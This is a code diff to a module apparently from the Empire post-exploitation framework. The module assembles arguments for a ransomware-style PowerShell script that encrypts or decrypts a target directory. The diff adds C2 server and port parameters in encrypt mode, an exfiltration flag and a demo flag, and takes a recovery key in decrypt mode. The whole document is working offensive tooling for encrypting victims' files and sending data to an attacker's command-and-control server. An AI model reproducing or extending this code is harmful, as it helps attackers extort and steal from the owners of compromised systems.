@@ -1,6 +1,8 @@
 from empire.server.common.empire import MainMenu
+from empire.server.core.exceptions import (
+    ModuleValidationException,
+)
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.module_util import handle_error_message
 
 
 class Module:
@@ -12,7 +14,6 @@ class Module:
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
-        # read in the common module source code
         script, err = main_menu.modulesv2.get_module_source(
             module_name=module.script_path,
             obfuscate=obfuscate,
@@ -20,28 +21,23 @@ class Module:
         )
 
         if err:
-            return handle_error_message(err)
+            raise ModuleValidationException("Invalid module source")
+
+        mode_flag = "-e" if params["Mode"] == "Encrypt" else "-d"
+        args = f"$args = @('{mode_flag}', '{params['Directory']}'"
 
         if params["Mode"] == "Encrypt":
-            args = f'$args = @(\'-e\', \'{params["Directory"]}\''
+            args += f", '-s', '{params['C2Server']}', '-p', '{params['C2Port']}'"
+            if params.get("Exfiltrate") == "True":
+                args += ", '-x'"
+            if params.get("Demo") == "True":
+                args += ", '-demo'"
+
         elif params["Mode"] == "Decrypt":
-            args = f'$args = @(\'-d\', \'{params["Directory"]}\''
-
-        if params["C2Server"] != "" and params["C2Port"] != "":
-            args += (
-                f', \'-s\', \'{params["C2Server"]}\', \'-p\', \'{params["C2Port"]}\''
-            )
-
-        if params["RecoveryKey"] != "":
-            args += f', \'-k\', \'{params["RecoveryKey"]}\''
-
-        if params["Exfiltrate"] == "True":
-            args += ", '-x'"
-
-        if params["Demo"] == "True":
-            args += ", '-demo'"
+            args += f", '-k', '{params['RecoveryKey']}'"
 
         args += ")\n"
+
         script = args + script
         return main_menu.modulesv2.finalize_module(
             script=script,
